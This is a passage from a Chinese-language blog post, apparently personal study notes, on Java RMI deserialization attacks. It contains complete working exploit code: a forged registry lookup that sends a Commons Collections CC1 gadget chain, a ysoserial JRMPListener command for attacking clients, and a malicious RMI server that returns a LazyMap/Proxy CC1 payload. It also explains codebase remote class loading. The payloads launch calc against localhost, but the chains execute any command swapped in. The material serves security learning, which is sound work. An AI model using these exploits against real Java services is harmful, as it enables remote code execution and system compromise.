var1)</span> <span class="hljs-keyword">throws</span> AccessException, NotBoundException, RemoteException &#123;<br>        <span class="hljs-keyword">try</span> &#123;<br>            <span class="hljs-comment">//newCll 构造远程调用对象</span><br>            <span class="hljs-type">RemoteCall</span> <span class="hljs-variable">var2</span> <span class="hljs-operator">=</span> <span class="hljs-built_in">super</span>.ref.newCall(<span class="hljs-built_in">this</span>, operations, <span class="hljs-number">2</span>, <span class="hljs-number">4905912898345647071L</span>);<br><br>            <span class="hljs-keyword">try</span> &#123;<br>                <span class="hljs-comment">//序列化lookup 传入的输入流</span><br>                <span class="hljs-type">ObjectOutput</span> <span class="hljs-variable">var3</span> <span class="hljs-operator">=</span> var2.getOutputStream();<br>                var3.writeObject(var1);<br>            &#125; <span class="hljs-keyword">catch</span> (IOException var18) &#123;<br>                <span class="hljs-keyword">throw</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">MarshalException</span>(<span class="hljs-string">&quot;error marshalling arguments&quot;</span>, var18);<br>            &#125;<br><br>            <span class="hljs-comment">//把上面序列化后的调用真正发往远端、执行远端方法。此处是把 lookup(var1) 请求发送到 RMI 服务器端并等待响应。</span><br>            <span class="hljs-built_in">super</span>.ref.invoke(var2);<br><br>            Remote var23;<br>            <span class="hljs-keyword">try</span> &#123;<br>                <span class="hljs-type">ObjectInput</span> <span class="hljs-variable">var6</span> <span class="hljs-operator">=</span> var2.getInputStream();<br>                var23 = (Remote)var6.readObject();<br>            &#125; <span class="hljs-keyword">catch</span> (IOException var15) &#123;<br>                <span class="hljs-keyword">throw</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">UnmarshalException</span>(<span class="hljs-string">&quot;error unmarshalling return&quot;</span>, var15);<br>            &#125; <span class="hljs-keyword">catch</span> (ClassNotFoundException var16) &#123;<br>                <span class="hljs-keyword">throw</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">UnmarshalException</span>(<span class="hljs-string">&quot;error unmarshalling return&quot;</span>, var16);<br>            &#125; <span class="hljs-keyword">finally</span> &#123;<br>                <span class="hljs-built_in">super</span>.ref.done(var2);<br>            &#125;<br><br>            <span class="hljs-keyword">return</span> var23;<br></code></pre></td></tr></table></figure><p><img src="https://cdn.jsdelivr.net/gh/XVSHIFU/Picture-bed@img/img/202509242103011.png"></p><p>调用 invoke 后就到了客户端请求注册中心的流程：<img src="https://cdn.jsdelivr.net/gh/XVSHIFU/Picture-bed@img/img/202509242103562.png"></p><h5 id="EXP：-1"><a href="#EXP：-1" class="headerlink" title="EXP："></a>EXP：</h5><p>在 bind 的基础上修改：</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br></pre></td><td class="code"><pre><code class="hljs java"><span class="hljs-keyword">package</span> com.attack;<br><br><span class="hljs-keyword">import</span> org.apache.commons.collections.Transformer;<br><span class="hljs-keyword">import</span> org.apache.commons.collections.functors.ChainedTransformer;<br><span class="hljs-keyword">import</span> org.apache.commons.collections.functors.ConstantTransformer;<br><span class="hljs-keyword">import</span> org.apache.commons.collections.functors.InvokerTransformer;<br><span class="hljs-keyword">import</span> org.apache.commons.collections.map.TransformedMap;<br><span class="hljs-keyword">import</span> sun.rmi.server.UnicastRef;<br><span class="hljs-keyword">import</span> java.io.ObjectOutput;<br><span class="hljs-keyword">import</span> java.lang.annotation.Target;<br><span class="hljs-keyword">import</span> java.lang.reflect.Constructor;<br><span class="hljs-keyword">import</span> java.lang.reflect.Field;<br><span class="hljs-keyword">import</span> java.rmi.registry.LocateRegistry;<br><span class="hljs-keyword">import</span> java.rmi.registry.Registry;<br><span class="hljs-keyword">import</span> java.rmi.server.Operation;<br><span class="hljs-keyword">import</span> java.rmi.server.RemoteCall;<br><span class="hljs-keyword">import</span> java.rmi.server.RemoteObject;<br><span class="hljs-keyword">import</span> java.util.HashMap;<br><span class="hljs-keyword">import</span> java.util.Map;<br><br><span class="hljs-keyword">public</span> <span class="hljs-keyword">class</span> <span class="hljs-title class_">AttackRegistryEXP02</span> &#123;<br>    <span class="hljs-keyword">public</span> <span class="hljs-keyword">static</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">main</span><span class="hljs-params">(String[] args)</span> <span class="hljs-keyword">throws</span> Exception&#123;<br>        <span class="hljs-type">Registry</span> <span class="hljs-variable">registry</span> <span class="hljs-operator">=</span> LocateRegistry.getRegistry(<span class="hljs-string">&quot;127.0.0.1&quot;</span>,<span class="hljs-number">1099</span>);<br><br>        <span class="hljs-comment">//通过反射拿到 UnicastRef</span><br>        Class&lt;?&gt; clazz = Class.forName(<span class="hljs-string">&quot;java.rmi.server.RemoteObject&quot;</span>);<br>        <span class="hljs-type">Field</span> <span class="hljs-variable">field</span> <span class="hljs-operator">=</span> clazz.getDeclaredField(<span class="hljs-string">&quot;ref&quot;</span>);<br>        field.setAccessible(<span class="hljs-literal">true</span>);<br>        <span class="hljs-type">UnicastRef</span> <span class="hljs-variable">ref</span> <span class="hljs-operator">=</span> (UnicastRef) field.get(registry);<br><br>        <span class="hljs-comment">//从这里开始模拟 lookup 的方式进行伪造方法调用</span><br>        <span class="hljs-comment">//这里手动构建了一次 Registry 远程调用</span><br>        Operation[] operations = <span class="hljs-keyword">new</span> <span class="hljs-title class_">Operation</span>[<span class="hljs-number">0</span>];<br>        <span class="hljs-type">RemoteCall</span> <span class="hljs-variable">var2</span> <span class="hljs-operator">=</span> ref.newCall((RemoteObject) registry, operations, <span class="hljs-number">2</span>, <span class="hljs-number">4905912898345647071L</span>);<br>        <span class="hljs-comment">//获取调用的输出流</span><br>        <span class="hljs-type">ObjectOutput</span> <span class="hljs-variable">var3</span> <span class="hljs-operator">=</span> var2.getOutputStream();<br>        <span class="hljs-comment">//序列化</span><br>        var3.writeObject(CC1());<br>        <span class="hljs-comment">//这里执行远程调用触发漏洞</span><br>        ref.invoke(var2);<br>    &#125;<br><br>    <span class="hljs-keyword">public</span> <span class="hljs-keyword">static</span> Object <span class="hljs-title function_">CC1</span><span class="hljs-params">()</span> <span class="hljs-keyword">throws</span> Exception&#123;<br>        Transformer[] transformers = <span class="hljs-keyword">new</span> <span class="hljs-title class_">Transformer</span>[]&#123;<br>                <span class="hljs-keyword">new</span> <span class="hljs-title class_">ConstantTransformer</span>(Runtime.class),<br>                <span class="hljs-keyword">new</span> <span class="hljs-title class_">InvokerTransformer</span>(<span class="hljs-string">&quot;getMethod&quot;</span>, <span class="hljs-keyword">new</span> <span class="hljs-title class_">Class</span>[]&#123;String.class, Class[].class&#125;, <span class="hljs-keyword">new</span> <span class="hljs-title class_">Object</span>[]&#123;<span class="hljs-string">&quot;getRuntime&quot;</span>, <span class="hljs-literal">null</span>&#125;),<br>                <span class="hljs-keyword">new</span> <span class="hljs-title class_">InvokerTransformer</span>(<span class="hljs-string">&quot;invoke&quot;</span>, <span class="hljs-keyword">new</span> <span class="hljs-title class_">Class</span>[]&#123;Object.class, Object[].class&#125;, <span class="hljs-keyword">new</span> <span class="hljs-title class_">Object</span>[]&#123;<span class="hljs-literal">null</span>, <span class="hljs-literal">null</span>&#125;),<br>                <span class="hljs-keyword">new</span> <span class="hljs-title class_">InvokerTransformer</span>(<span class="hljs-string">&quot;exec&quot;</span>, <span class="hljs-keyword">new</span> <span class="hljs-title class_">Class</span>[]&#123;String.class&#125;, <span class="hljs-keyword">new</span> <span class="hljs-title class_">Object</span>[]&#123;<span class="hljs-string">&quot;calc&quot;</span>&#125;)<br>        &#125;;<br>        <span class="hljs-type">ChainedTransformer</span> <span class="hljs-variable">chainedTransformer</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">ChainedTransformer</span>(transformers);<br>        HashMap&lt;Object, Object&gt; hashMap = <span class="hljs-keyword">new</span> <span class="hljs-title class_">HashMap</span>&lt;&gt;();<br>        hashMap.put(<span class="hljs-string">&quot;value&quot;</span>,<span class="hljs-string">&quot;value&quot;</span>);<br>        Map&lt;Object, Object&gt; transformedMap = TransformedMap.decorate(hashMap, <span class="hljs-literal">null</span>, chainedTransformer);<br>        <span class="hljs-type">Class</span> <span class="hljs-variable">c</span> <span class="hljs-operator">=</span> Class.forName(<span class="hljs-string">&quot;sun.reflect.annotation.AnnotationInvocationHandler&quot;</span>);<br>        <span class="hljs-type">Constructor</span> <span class="hljs-variable">constructor</span> <span class="hljs-operator">=</span> c.getDeclaredConstructor(Class.class, Map.class);<br>        constructor.setAccessible(<span class="hljs-literal">true</span>);<br>        <span class="hljs-type">Object</span> <span class="hljs-variable">o</span> <span class="hljs-operator">=</span> constructor.newInstance(Target.class, transformedMap);<br>        <span class="hljs-keyword">return</span> o;<br>    &#125;<br>&#125;<br><br></code></pre></td></tr></table></figure><p><img src="https://cdn.jsdelivr.net/gh/XVSHIFU/Picture-bed@img/img/202509242103340.png"></p><h3 id="4-2-攻击客户端"><a href="#4-2-攻击客户端" class="headerlink" title="4.2 攻击客户端"></a>4.2 攻击客户端</h3><h4 id="4-2-1-注册中心攻击客户端"><a href="#4-2-1-注册中心攻击客户端" class="headerlink" title="4.2.1 注册中心攻击客户端"></a>4.2.1 注册中心攻击客户端</h4><blockquote><p>除了 unbind 和 rebind 都会返回数据给客户端，返回的数据是序列化形式，那么到了客户端就会进行反序列化，如果我们能控制注册中心的返回数据，那么就能实现对客户端的攻击，这里使用ysoserial 的 JRMPListener，因为 EXP 实在太长了。</p></blockquote><p><img src="https://cdn.jsdelivr.net/gh/XVSHIFU/Picture-bed@img/img/202509242103591.png"></p><p><code>java -cp ysoserial-0.0.6-SNAPSHOT-all.jar ysoserial.exploit.JRMPListener 1099  CommonsCollections1 &#39;calc&#39;</code></p><p>客户端去访问：</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><code class="hljs java"><span class="hljs-keyword">import</span> java.rmi.Naming;<br><span class="hljs-keyword">import</span> java.rmi.RemoteException;<br><span class="hljs-keyword">import</span> java.rmi.registry.LocateRegistry;<br><span class="hljs-keyword">import</span> java.rmi.registry.Registry;<br> <br><span class="hljs-keyword">public</span> <span class="hljs-keyword">class</span> <span class="hljs-title class_">Client</span> &#123;<br>    <span class="hljs-keyword">public</span> <span class="hljs-keyword">static</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">main</span><span class="hljs-params">(String[] args)</span> <span class="hljs-keyword">throws</span> RemoteException &#123;<br>        <span class="hljs-type">Registry</span> <span class="hljs-variable">registry</span> <span class="hljs-operator">=</span> LocateRegistry.getRegistry(<span class="hljs-string">&quot;127.0.0.1&quot;</span>,<span class="hljs-number">1099</span>);<br>        registry.list();<br>    &#125;<br>&#125;<br></code></pre></td></tr></table></figure><p>但是运行完什么都没有发生。。</p><p><img src="https://cdn.jsdelivr.net/gh/XVSHIFU/Picture-bed@img/img/202509242104922.png"></p><h5 id="后续发现俩个问题，"><a href="#后续发现俩个问题，" class="headerlink" title="后续发现俩个问题，"></a>后续发现俩个问题，</h5><h6 id="一是-Java-版本"><a href="#一是-Java-版本" class="headerlink" title="一是 Java 版本"></a>一是 Java 版本</h6><p>如果是用CC1链，Java版本低于 1.8.0_65</p><p><img src="https://cdn.jsdelivr.net/gh/XVSHIFU/Picture-bed@img/img/202509242104627.png"></p><p>当然，高版本可以用 CC6 链绕过也是可以的</p><p><img src="https://cdn.jsdelivr.net/gh/XVSHIFU/Picture-bed@img/img/202509242104501.png"></p><h6 id="二是运行计算器时因为加了-单引号-‘’-而找不到程序"><a href="#二是运行计算器时因为加了-单引号-‘’-而找不到程序" class="headerlink" title="二是运行计算器时因为加了 单引号 ‘’ 而找不到程序"></a>二是运行计算器时因为加了 单引号 ‘’ 而找不到程序</h6><p><img src="https://cdn.jsdelivr.net/gh/XVSHIFU/Picture-bed@img/img/202509242104209.png"></p><p>运行 <code>calc</code> <code>&quot;calc&quot;</code> 都可以正常弹出</p><p><img src="https://cdn.jsdelivr.net/gh/XVSHIFU/Picture-bed@img/img/202509242104888.png"></p><p><img src="https://cdn.jsdelivr.net/gh/XVSHIFU/Picture-bed@img/img/202509242104542.png"></p><p><strong>根据 AI 的解释：在Windows系统中，cmd 命令行参数的单引号不会被自动去除，而是作为参数的一部分传递。当ysoserial尝试执行命令时，它接收到的是带单引号的 <code>&#39;calc&#39;</code>，而不是单纯的 <code>calc</code>。当我们换成 power shell 时，是可以正确执行的。</strong></p><p><img src="https://cdn.jsdelivr.net/gh/XVSHIFU/Picture-bed@img/img/202509251941223.png" alt="img"></p><h4 id="4-2-2-服务端攻击客户端"><a href="#4-2-2-服务端攻击客户端" class="headerlink" title="4.2.2 服务端攻击客户端"></a>4.2.2 服务端攻击客户端</h4><p>服务端攻击客户端，可分俩种情形：</p><ol><li><font style="color:rgb(80, 80, 92);">服务端返回Object对象</font></li><li><font style="color:rgb(80, 80, 92);">远程加载对象</font></li></ol><h5 id="服务端返回Object对象"><a href="#服务端返回Object对象" class="headerlink" title="服务端返回Object对象"></a><font style="color:rgb(80, 80, 92);">服务端返回Object对象</font></h5><p>RMI 远程方法调用返回的不一定是一个基础数据类型（比如String  int），也会返回一个对象。服务端返回给客户端一个对象，客户端要对这个对象反序列化。所以我们伪造一个服务端，当客户端调用某个方法时，返回的就是恶意对象，就可以攻击客户端。</p><p>User 接口，返回 Object 对象</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><code class="hljs java"><span class="hljs-keyword">package</span> com;<br><br><span class="hljs-keyword">public</span> <span class="hljs-keyword">interface</span> <span class="hljs-title class_">User</span> <span class="hljs-keyword">extends</span> <span class="hljs-title class_">java</span>.rmi.Remote &#123;<br>    Object <span class="hljs-title function_">getUser</span><span class="hljs-params">()</span> <span class="hljs-keyword">throws</span> Exception;<br>&#125;<br></code></pre></td></tr></table></figure><p>服务端实现 User 接口，返回 CC1 恶意 Object 对象</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br></pre></td><td class="code"><pre><code class="hljs java"><span class="hljs-keyword">package</span> com;<br><br><span class="hljs-keyword">import</span> org.apache.commons.collections.Transformer;<br><span class="hljs-keyword">import</span> org.apache.commons.collections.functors.ChainedTransformer;<br><span class="hljs-keyword">import</span> org.apache.commons.collections.functors.ConstantTransformer;<br><span class="hljs-keyword">import</span> org.apache.commons.collections.functors.InvokerTransformer;<br><span class="hljs-keyword">import</span> org.apache.commons.collections.map.LazyMap;<br><br><span class="hljs-keyword">import</span> java.lang.annotation.Retention;<br><span class="hljs-keyword">import</span> java.lang.reflect.Constructor;<br><span class="hljs-keyword">import</span> java.lang.reflect.InvocationHandler;<br><span class="hljs-keyword">import</span> java.lang.reflect.Proxy;<br><span class="hljs-keyword">import</span> java.rmi.RemoteException;<br><span class="hljs-keyword">import</span> java.rmi.server.UnicastRemoteObject;<br><span class="hljs-keyword">import</span> java.util.HashMap;<br><span class="hljs-keyword">import</span> java.util.Map;<br><br><span class="hljs-keyword">public</span> <span class="hljs-keyword">class</span> <span class="hljs-title class_">ServerReturnObject</span> <span class="hljs-keyword">extends</span> <span class="hljs-title class_">UnicastRemoteObject</span> <span class="hljs-keyword">implements</span> <span class="hljs-title class_">User</span>  &#123;<br>    <span class="hljs-keyword">public</span> String name;<br>    <span class="hljs-keyword">public</span> <span class="hljs-type">int</span> age;<br><br>    <span class="hljs-keyword">public</span> <span class="hljs-title function_">ServerReturnObject</span><span class="hljs-params">(String name, <span class="hljs-type">int</span> age)</span> <span class="hljs-keyword">throws</span> RemoteException &#123;<br>        <span class="hljs-built_in">super</span>();<br>        <span class="hljs-built_in">this</span>.name = name;<br>        <span class="hljs-built_in">this</span>.age = age;<br>    &#125;<br><br>    <span class="hljs-meta">@Override</span><br>    <span class="hljs-keyword">public</span> Object <span class="hljs-title function_">getUser</span><span class="hljs-params">()</span> <span class="hljs-keyword">throws</span> Exception &#123;<br><br>        Transformer[] transformers = <span class="hljs-keyword">new</span> <span class="hljs-title class_">Transformer</span>[]&#123;<br>            <span class="hljs-keyword">new</span> <span class="hljs-title class_">ConstantTransformer</span>(Runtime.class),<br>            <span class="hljs-keyword">new</span> <span class="hljs-title class_">InvokerTransformer</span>(<span class="hljs-string">&quot;getMethod&quot;</span>, <span class="hljs-keyword">new</span> <span class="hljs-title class_">Class</span>[]&#123;String.class, Class[].class&#125;, <span class="hljs-keyword">new</span> <span class="hljs-title class_">Object</span>[]&#123;<span class="hljs-string">&quot;getRuntime&quot;</span>, <span class="hljs-keyword">new</span> <span class="hljs-title class_">Class</span>[<span class="hljs-number">0</span>]&#125;),<br>            <span class="hljs-keyword">new</span> <span class="hljs-title class_">InvokerTransformer</span>(<span class="hljs-string">&quot;invoke&quot;</span>, <span class="hljs-keyword">new</span> <span class="hljs-title class_">Class</span>[]&#123;Object.class, Object[].class&#125;, <span class="hljs-keyword">new</span> <span class="hljs-title class_">Object</span>[]&#123;<span class="hljs-literal">null</span>, <span class="hljs-keyword">new</span> <span class="hljs-title class_">Object</span>[<span class="hljs-number">0</span>]&#125;),<br>            <span class="hljs-keyword">new</span> <span class="hljs-title class_">InvokerTransformer</span>(<span class="hljs-string">&quot;exec&quot;</span>, <span class="hljs-keyword">new</span> <span class="hljs-title class_">Class</span>[]&#123;String.class&#125;, <span class="hljs-keyword">new</span> <span class="hljs-title class_">String</span>[]&#123;<span class="hljs-string">&quot;calc.exe&quot;</span>&#125;),<br>        &#125;;<br>        <span class="hljs-type">Transformer</span> <span class="hljs-variable">transformerChain</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">ChainedTransformer</span>(transformers);<br>        <span class="hljs-type">Map</span> <span class="hljs-variable">innerMap</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">HashMap</span>();<br>        <span class="hljs-type">Map</span> <span class="hljs-variable">outerMap</span> <span class="hljs-operator">=</span> LazyMap.decorate(innerMap, transformerChain);<br><br>        <span class="hljs-type">Class</span> <span class="hljs-variable">clazz</span> <span class="hljs-operator">=</span> Class.forName(<span class="hljs-string">&quot;sun.reflect.annotation.AnnotationInvocationHandler&quot;</span>);<br>        <span class="hljs-type">Constructor</span> <span class="hljs-variable">construct</span> <span class="hljs-operator">=</span> clazz.getDeclaredConstructor(Class.class, Map.class);<br>        construct.setAccessible(<span class="hljs-literal">true</span>);<br>        <span class="hljs-type">InvocationHandler</span> <span class="hljs-variable">handler</span> <span class="hljs-operator">=</span> (InvocationHandler) construct.newInstance(Retention.class, outerMap);<br>        <span class="hljs-type">Map</span> <span class="hljs-variable">proxyMap</span> <span class="hljs-operator">=</span> (Map) Proxy.newProxyInstance(Map.class.getClassLoader(), <span class="hljs-keyword">new</span> <span class="hljs-title class_">Class</span>[]&#123;Map.class&#125;, handler);<br>        handler = (InvocationHandler) construct.newInstance(Retention.class, proxyMap);<br><br>        <span class="hljs-keyword">return</span> handler;<br>    &#125;<br>&#125;<br></code></pre></td></tr></table></figure><p>恶意服务端将恶意对象注册到注册中心</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><code class="hljs java"><span class="hljs-keyword">package</span> com;<br><br><span class="hljs-keyword">import</span> java.rmi.AlreadyBoundException;<br><span class="hljs-keyword">import</span> java.rmi.RemoteException;<br><span class="hljs-keyword">import</span> java.rmi.registry.LocateRegistry;<br><span class="hljs-keyword">import</span> java.rmi.registry.Registry;<br><br><span class="hljs-keyword">public</span> <span class="hljs-keyword">class</span> <span class="hljs-title class_">EvilClassServer</span> &#123;<br>    <span class="hljs-keyword">public</span> <span class="hljs-keyword">static</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">main</span><span class="hljs-params">(String[] args)</span> <span class="hljs-keyword">throws</span> RemoteException, AlreadyBoundException &#123;<br>        <span class="hljs-type">User</span> <span class="hljs-variable">liming</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">ServerReturnObject</span>(<span class="hljs-string">&quot;liming&quot;</span>,<span class="hljs-number">15</span>);<br>        <span class="hljs-type">Registry</span> <span class="hljs-variable">registry</span> <span class="hljs-operator">=</span> LocateRegistry.createRegistry(<span class="hljs-number">1099</span>);<br>        registry.bind(<span class="hljs-string">&quot;user&quot;</span>,liming);<br>    &#125;<br>&#125;<br></code></pre></td></tr></table></figure><p>客户端获取恶意对象，调用 getUser() 方法，反序列化恶意远程对象</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><code class="hljs java"><span class="hljs-keyword">package</span> com;<br><br><span class="hljs-keyword">import</span> java.rmi.registry.LocateRegistry;<br><span class="hljs-keyword">import</span> java.rmi.registry.Registry;<br><br><span class="hljs-keyword">public</span> <span class="hljs-keyword">class</span> <span class="hljs-title class_">EvilClient</span> &#123;<br>    <span class="hljs-keyword">public</span> <span class="hljs-keyword">static</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">main</span><span class="hljs-params">(String[] args)</span> <span class="hljs-keyword">throws</span> Exception &#123;<br>        <span class="hljs-type">Registry</span> <span class="hljs-variable">registry</span> <span class="hljs-operator">=</span> LocateRegistry.getRegistry(<span class="hljs-string">&quot;127.0.0.1&quot;</span>,<span class="hljs-number">1099</span>);<br>        <span class="hljs-type">User</span> <span class="hljs-variable">user</span> <span class="hljs-operator">=</span> (User)registry.lookup(<span class="hljs-string">&quot;user&quot;</span>);<br>        user.getUser();<br>    &#125;<br>&#125;<br></code></pre></td></tr></table></figure><p><img src="https://cdn.jsdelivr.net/gh/XVSHIFU/Picture-bed@img/img/202509242104061.png"></p><h5 id="远程加载对象"><a href="#远程加载对象" class="headerlink" title="远程加载对象"></a><font style="color:rgb(80, 80, 92);">远程加载对象</font></h5><blockquote><p>《Java 安全漫谈》</p><p>codebase是一个地址，告诉Java虚拟机我们应该从哪个地方去搜索类，有点像我们日常用的</p><p>CLASSPATH，但CLASSPATH是本地路径，而codebase通常是远程URL，比如http、ftp等。</p><p>如果我们指定 codebase&#x3D;<a href="http://example.com/">http://example.com/</a> ，然后加载 org.vulhub.example.Example 类，则</p><p>Java虚拟机会下载这个文件 <a href="http://example.com/org/vulhub/example/Example.class">http://example.com/org/vulhub/example/Example.class</a> ，并作为</p><p>Example类的字节码。</p><p>RMI的流程中，客户端和服务端之间传递的是一些序列化后的对象，这些对象在反序列化时，就会去寻</p><p>找类。如果某一端反序列化时发现一个对象，那么就会去自己的CLASSPATH下寻找想对应的类；如果在</p><p>本地没有找到这个类，就会去远程加载codebase中的类。</p><p>这个时候问题就来了，如果codebase被控制，我们不就可以加载恶意类了吗？</p><p>对，在RMI中，我们是可以将codebase随着序列化数据一起传输的，服务器在接收到这个数据后就会去</p><p>CLASSPATH和指定的codebase寻找类，由于codebase被控制导致任意命令执行漏洞。</p><p>不过显然官方也注意到了这一个安全隐患，所以只有满足如下条件的RMI服务器才能被攻击：</p><ul><li>安装并配置了SecurityManager</li><li>Java版本低于7u21、6u45，或者设置了 java.rmi.server.useCodebaseOnly&#x3D;false</li></ul><p>其中 java.rmi.server.useCodebaseOnly 是在Java 7u21、6u45的时候修改的一个默认设置：</p><p><a href="https://docs.oracle.com/javase/7/docs/technotes/guides/rmi/enhancements-7.html">https://docs.oracle.com/javase/7/docs/technotes/guides/rmi/enhancements-7.html</a></p><p><a href="https://www.oracle.com/technetwork/java/javase/7u21-relnotes-1932873.html">https://www.oracle.com/technetwork/java/javase/7u21-relnotes-1932873.html</a></p><p>官方将 java.rmi.server.useCodebaseOnly 的默认值由 false 改为了 true 。在 java.rmi.server.useCodebaseOnly 配置为 true 的情况下，Java虚拟机将只信任预先配置好的 codebase ，不再支持从RMI请求中获取。</p></blockquote><h3 id="4-3-攻击服务端"><a href="#4-3-攻击服务端" class="headerlink" title="4.3 攻击服务端"></a>4.3 攻击服务端</h3><p>这一部分同样是熟悉的 unmarshalValue ,</p><p><img src="https://cdn.jsdelivr.net/gh/XVSHIFU/Picture-bed@img/img/202509242105634.png"></p><p><strong>服务端调用方法时，存在非基础类型的参数时，就会被恶意 Client 端传入恶意数据触发反序列化</strong></p><h2 id="参考文章："><a href="#参考文章：" class="headerlink" title="参考文章："></a>参考文章：</h2><p>官方文档</p><p><a href="https://docs.oracle.com/javase/tutorial/rmi/overview.html">https://docs.oracle.com/javase/tutorial/rmi/overview.html</a></p><p><font style="color:rgb(34, 34, 38);">从懵逼到恍然大悟之Java中RMI的使用</font></p><p><a href="https://blog.csdn.net/lmy86263/article/details/72594760">https://blog.csdn.net/lmy86263/article/details/72594760</a></p><p><font style="color:rgb(51, 51, 51);">JAVA安全基础（四）– RMI机制</font></p><p><a href="https://xz.aliyun.com/news/8760">https://xz.aliyun.com/news/8760</a></p><p><font style="color:rgb(68, 68, 68);">一文回顾攻击Java RMI方式</font></p><p><a href="https://www.anquanke.com/post/id/263726#h2-5">https://www.anquanke.com/post/id/263726#h2-5</a></p><p>Java RMI 攻击由浅入深</p><p><a href="https://su18.org/post/rmi-attack/">https://su18.org/post/rmi-attack/</a></p><p><a href="https://drun1baby.top/2022/07/23/Java%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E4%B9%8BRMI%E4%B8%93%E9%A2%9802-RMI%E7%9A%84%E5%87%A0%E7%A7%8D%E6%94%BB%E5%87%BB%E6%96%B9%E5%BC%8F/">https://drun1baby.top/2022/07/23/Java%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E4%B9%8BRMI%E4%B8%93%E9%A2%9802-RMI%E7%9A%84%E5%87%A0%E7%A7%8D%E6%94%BB%E5%87%BB%E6%96%B9%E5%BC%8F/</a></p><p><a href="https://www.cnblogs.com/pihaochen/p/11020596.html"><font style="color:rgb(89, 182, 215);">https://www.cnblogs.com/pihaochen/p/11020596.html</font></a></p><p><a href="https://xz.aliyun.com/t/9053"><font style="color:rgb(89, 182, 215);">https://xz.aliyun.com/t/9053</font></a></p><p><a href="https://xz.aliyun.com/t/7930"><font style="color:rgb(89, 182, 215);">https://xz.aliyun.com/t/7930</font></a></p><p><a href="https://xz.aliyun.com/t/6660"><font style="color:rgb(89, 182, 215);">https://xz.aliyun.com/t/6660</font></a></p><p><a href="https://xz.aliyun.com/t/7079"><font style="color:rgb(89, 182, 215);">https://xz.aliyun.com/t/7079</font></a></p>]]></content>
    
    
    <categories>
      
      <category>Java</category>
      
    </categories>
    
    
    <tags>
      
      <tag>java 学习</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>CC4_CC2_CC5_CC7</title>
    <link href="/2025/09/02/CC4_CC2_CC5_CC7/"/>
